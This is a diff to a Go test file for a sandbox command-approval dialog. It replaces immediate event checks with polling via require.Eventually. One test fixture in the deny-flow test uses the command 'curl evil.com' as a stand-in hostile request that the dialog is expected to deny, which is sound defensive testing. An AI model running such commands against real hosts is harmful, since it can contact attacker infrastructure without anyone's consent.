@@ -4,6 +4,7 @@ import (
 	"strings"
 	"sync"
 	"testing"
+	"time"
 
 	"weave/sdk"
 
@@ -108,8 +109,12 @@ func TestApproveDialog_ApproveFlow(t *testing.T) {
 	}))
 
 	// Wait for goroutine to complete
-	approved := bus.published("sandbox.approved")
-	require.Len(t, approved, 1, "expected one sandbox.approved event")
+	var approved []sdk.Event
+
+	require.Eventually(t, func() bool {
+		approved = bus.published("sandbox.approved")
+		return len(approved) == 1
+	}, time.Second, 10*time.Millisecond, "expected one sandbox.approved event")
 
 	payload, ok := approved[0].Payload.(map[string]string)
 	require.True(t, ok, "expected map[string]string payload")
@@ -135,8 +140,12 @@ func TestApproveDialog_DenyFlow(t *testing.T) {
 		"command": "curl evil.com",
 	}))
 
-	denied := bus.published("sandbox.denied")
-	require.Len(t, denied, 1, "expected one sandbox.denied event")
+	var denied []sdk.Event
+
+	require.Eventually(t, func() bool {
+		denied = bus.published("sandbox.denied")
+		return len(denied) == 1
+	}, time.Second, 10*time.Millisecond, "expected one sandbox.denied event")
 
 	payload, ok := denied[0].Payload.(map[string]string)
 	require.True(t, ok)
@@ -157,15 +166,23 @@ func TestApproveDialog_TrustForSessionFlow(t *testing.T) {
 		"command": "npm install",
 	}))
 
-	trusted := bus.published("sandbox.trust")
-	require.Len(t, trusted, 1, "expected one sandbox.trust event")
+	var trusted []sdk.Event
+
+	require.Eventually(t, func() bool {
+		trusted = bus.published("sandbox.trust")
+		return len(trusted) == 1
+	}, time.Second, 10*time.Millisecond, "expected one sandbox.trust event")
 
 	payload, ok := trusted[0].Payload.(map[string]string)
 	require.True(t, ok)
 	assert.Equal(t, "npm install", payload["pattern"])
 
-	approved := bus.published("sandbox.approved")
-	require.Len(t, approved, 1, "expected one sandbox.approved event after trust")
+	var approved []sdk.Event
+
+	require.Eventually(t, func() bool {
+		approved = bus.published("sandbox.approved")
+		return len(approved) == 1
+	}, time.Second, 10*time.Millisecond, "expected one sandbox.approved event after trust")
 }
 
 func TestApproveDialog_SelectError_Denies(t *testing.T) {
@@ -182,8 +199,12 @@ func TestApproveDialog_SelectError_Denies(t *testing.T) {
 		"command": "some-command",
 	}))
 
-	denied := bus.published("sandbox.denied")
-	require.Len(t, denied, 1)
+	var denied []sdk.Event
+
+	require.Eventually(t, func() bool {
+		denied = bus.published("sandbox.denied")
+		return len(denied) == 1
+	}, time.Second, 10*time.Millisecond, "expected one sandbox.denied event")
 }
 
 func TestApproveDialog_InvalidPayload_Ignored(t *testing.T) {
